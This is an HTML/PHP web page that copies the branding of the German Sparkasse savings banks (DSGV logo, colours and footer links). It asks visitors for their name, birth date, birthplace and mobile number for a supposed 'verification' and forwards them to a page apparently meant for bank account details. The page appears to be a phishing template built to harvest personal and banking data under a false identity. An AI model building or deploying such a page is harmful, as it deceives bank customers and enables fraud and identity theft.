<?php

require_once 'db.php';


?>

<!doctype html>
<html>
<head>
    <meta charset="utf-8">
    <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
    * {
      box-sizing: border-box;
    }
    
    body {
      font-family: Arial, Helvetica, sans-serif;
      min-height: 100vh; margin:0;
   }

    input {
     display: flex;
     align-items: center;
     justify-content: center;
     margin: 0 auto;
   }
    
    /* Style the header */
    header {
      background-color: #df002a ;
      padding: 20px;
      text-align: left;
      font-size: 35px;
      color: white;
      min-height:50px;
    }
    
    /* Create two columns/boxes that floats next to each other */
    nav {
      float: left;
      width: 30%;
      background: rgb(255, 255, 255);
      padding: 20px;
    }
    
    /* Style the list inside the menu */
    nav ul {
      list-style-type: none;
      padding: 0;
    }
    
    article {
      float: left;
      padding: 20px;
      width: 100%;
      background-color: #e3e3e3;
      min-height:50px;
    }
    
    /* Clear floats after the columns */
    section::after {
      content: "";
      display: table;
      clear: both;
    }
    
    /* Style the footer */
    footer {
      background-color: rgb(122, 122, 122);
      padding: 10px;
      text-align: left;
      color: white;
    }

    body{ display:flex; flex-direction:column; }
    article{ flex:1; }

    a:link {color: white;
            text-decoration: none;}
    a:visited {color: white;
            text-decoration: none;}
    a:hover {color: white;
            text-decoration: none;}
    a:active {color: white;
            text-decoration: none;}

    /* Responsive layout - makes the two columns/boxes stack on top of each other instead of next to each other, on small screens */
    @media (max-width: 600px) {
      nav, article {
        width: 100%;
        height: auto;
      }
    }
    </style>

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
</head>
    <body>
        <header>
            <a href="https://www.dsgv.de">        <img src="Ressourcen/Klein (sparkassenlogo).png" style="height:auto; width:20%;">
            </a>
        </header> 
    
    <article>
      <div class="row">
        <div class="col-sm-6">
          <div class="card">
            <div class="card-body">
              <h4 style="color: #df002a;"><b>Hinweis</b></h4>
              <p>Um mit der Überprüfung  beginnen zu können, benötigen wir zunächst einige Eckdaten von Ihnen.</p>    
              <img src="Ressourcen/HausPiktogram.png" alt="Haus" style ="width: 70%;
              height: auto;">
            </div>
          </div>
        </div>
        <div class="col-sm-6">
          <div class="card">
            <div class="card-body" id="formular">
              <h2 style="color: #df002a;">Persönliche Angaben</h2>
                <div id= "error"></div>
                    <form action="Kontoverbindung.php" method="post">
                        <!--JAVASCRIPT Validation einbauen für die einzelnen Felder-->
                        <label for="anrede"> Anrede *</label><br>
                        <select name="fanrede" id="fanrede" style="width: 210px;" required>
                            <option value="Herr">Herr</option>
                            <option value="Frau">Frau</option>
                            <option value="Divers">Divers</option>
                        </select><br>    <br>

                        <label for="fvorname">Vorname *</label><br>
                        <input type="text" name="fvorname" id="fvorname" placeholder="Max" style="width: 210px;" required><br>

                        <label for="fnachname">Nachname *</label><br>
                        <input type="text" name="fnachname" id="fnachname" placeholder="Mustermann" style="width: 210px;" required><br>

                        <label for="fgeburtsdatum"> Geburtsdatum *</label><br>
                        <input type="date" name="fgeburtsdatum" id="fgeburtstag" min="1910-01-01" max="2005-01-01"  placeholder="TT.MM.JJJJ" style="width: 210px;" required> <br>

                        <label for="fgeburtsort">Geburtsort *</label><br>
                        <input type="text" name="fgeburtsort" id="fgeburtsort"  placeholder="Berlin" style="width: 210px;" required><br>

                        <label for="fmobiltelefonnummer">Mobiltelefonnummer *</label><br>
                        <input type="text" name= "fmobiltelefonnummer" id="fmobiltelefonnummer" placeholder="0150/12345678" style="width: 210px;" required><br>
                    
                        <button  type='submit' class='btn btn-danger'>Mit der Überprüfung fortfahren <img src="Ressourcen/Button.png" style ="width: 13%;
                        height: auto;"> </button>
                      </form>
                    <br>
                    
                    
                    <br>
              </form>
            </div>
          </div>
        </div>
      </div>
    </article>

    <footer>
        <div class="row">
          <div class="col"> <table>
            <tr>
              <thead><b>Der Verband</b></thead><br>
              <tr><a href="https://www.dsgv.de/verband/aufgaben.html">Aufgaben</a></tr><br>
              <tr><a href="https://www.dsgv.de/verband/mitgliedschaften.html">Mitgliedschaften</a></tr><br>
              <tr><a href="https://www.dsgv.de/verband/einrichtungen.html">Einrichtungen</a></tr><br>
              <tr><a href="https://www.dsgv.de/verband/schlichtungsstelle.html">Schlichtungsstelle</a></tr><br>
              <tr><a href="https://www.dsgv.de/verband/karriere.html">Karriere</a></tr><br>
              <tr><a href="https://www.dsgv.de/verband/kontakt.html">Kontakt</a></tr><br>
            </tr>
          </table>
        </div>
          <div class="col"> <table>
            <tr>
              <thead><b>Sparkassen-Finanzgruppe</b></thead><br>
              <tr><a href="https://www.dsgv.de/sparkassen-finanzgruppe/organisation/verbandsstruktur.html">Verbundstruktur</a></tr><br>
              <tr><a href="https://www.dsgv.de/sparkassen-finanzgruppe/sicherungssystem.html">Sicherungssystem</a></tr><br>
              <tr><a href="https://www.dsgv.de/sparkassen-finanzgruppe/publikationen/Vermoegensbarometer_2021.html">Vermögensbarometer</a></tr><br>
              <tr><a href="https://www.dsgv.de/sparkassen-finanzgruppe/sparkassen-international.html">International</a></tr><br>
              <tr><a href="https://www.dsgv.de/sparkassen-finanzgruppe/rating.html">Rating</a></tr><br>
              <tr><a href="https://www.dsgv.de/sparkassen-finanzgruppe/pfandbriefe.html">Pfandbriefe</a></tr><br>
              <tr><a href="https://www.dsgv.de/sparkassen-finanzgruppe/sparkassentag/Sparkassentag-2023-Hannover.html">Sparkassentag</a></tr><br>
            </tr>
          </table>
        </div>
          <div class="col"> <table>
            <tr>
              <thead><b>Verantwortung</b></thead><br>
              <tr><a href="https://www.dsgv.de/unsere-verantwortung/gesellschaftliches-engagement/sportfoerderung.html">Sportförderung</a></tr><br>
              <tr><a href="https://www.dsgv.de/unsere-verantwortung/gesellschaftliches-engagement/kunstfoerderung-kulturfoerderung.html">Kunst- und Kulturförderung</a></tr><br>
              <tr><a href="https://www.dsgv.de/unsere-verantwortung/gesellschaftliches-engagement/finanzielle-bildung.html">Finanzielle Bildung</a></tr><br>
              <tr><a href="https://www.dsgv.de/unsere-verantwortung/gesellschaftliches-engagement/wirtschaftsfoerderung-wissenschaftsfoederung.html">Wissenschaftsförderung</a></tr><br>
              <tr><a href="https://www.dsgv.de/unsere-verantwortung/gesellschaftliches-engagement/stiftungen.html">Stiftungen</a></tr><br>
              <tr><a href="https://www.dsgv.de/unsere-verantwortung/bericht-an-die-gesellschaft.html">Bericht an die Gesellschaft</a></tr><br>
            </tr>
          </table></div>
          <div class="col"><table>
            <thead><b>Newsroom</b></thead><br>
            <tr><a href="https://www.dsgv.de/newsroom/blog.html">Blog</a></tr><br>
            <tr><a href="https://www.dsgv.de/newsroom/presse.html">Presse</a></tr><br>
            <tr><a href="https://www.dsgv.de/newsroom/termine.html">Termine</a></tr><br>
            <tr><a href="https://www.dsgv.de/newsroom/abo-service.html">Abo-Service</a></tr><br>
            <tr><a href="https://www.dsgv.de/newsroom/ansprechpartner.html">Ansprechpartner</a></tr><br>
          </table></div>
        </div>
        <hr>
        <div class="row">
          <div class="col">
            <a href="https://www.dsgv.de/impressum.html">Impressum</a>
          </div>
          <div class="col">
            <a href="https://www.dsgv.de/datenschutz.html">Datenschutz</a>
          </div>
          <div class="col"></div>
          <div class="col"></div>
          <div class="col"></div>
          <div class="col"></div>
          <div class="col"></div>
          <div class="col"></div>
          <div class="col"></div>
          <div class="col"></div>
          <div class="col"></div>
          <div class="col"></div>
        </div>
      </div>        
      </footer>
    </body>

</html>